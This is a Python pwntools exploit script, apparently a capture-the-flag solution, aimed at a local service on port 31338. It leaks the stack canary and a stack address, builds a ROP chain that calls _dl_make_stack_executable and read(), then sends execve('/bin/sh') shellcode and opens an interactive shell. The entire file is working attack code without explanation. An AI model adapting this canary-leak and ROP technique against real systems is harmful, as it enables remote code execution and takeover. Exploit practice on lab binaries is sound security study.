from pwn import *

context.terminal = 'terminator'
context.log_level = 'debug'

p = remote('127.0.0.1', 31338)
#gdb.attach(p)
p.sendline('A'*24)
p.recvuntil('A'*24)
currupted_canary = p.recv(8)
fixed_canary = '\x00' + currupted_canary[1::]

corr_y = p.recv(3)
y = corr_y + '\x00'*5

p.recvline()

p.sendline('A'*63)
o = p.recv(1024).split('\n')[1]
shellcode_addr = o+"\x00"*2

mr = p64(0x00000000004683b0)
mrr = p64(0x0000000000417b21)
prdxret = p64(0x0000000000443776)
stack_prot = p64(0x00000000006CBFE0)

payload = 'B'*24 + fixed_canary + y + prdxret + stack_prot + mr + mrr

prdiret = p64(0x00000000004005d5)
libc_stack_end = p64(0x0000000006CBF90)
dl_make_stack_exec = p64(0x0000000004768A0)

payload += prdiret + libc_stack_end + dl_make_stack_exec


nbytes = p64(27)
fdes = p64(0)
read = p64(0x000000000440300)
prsiret = p64(0x00000000004017f7)
prdiret = p64(0x00000000004005d5)

payload += prdxret + nbytes + prsiret + shellcode_addr + prdiret + p64(0) + read + shellcode_addr

p.sendline(payload)

p.sendline('exit')
binsh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.sendline(binsh)

p.interactive()
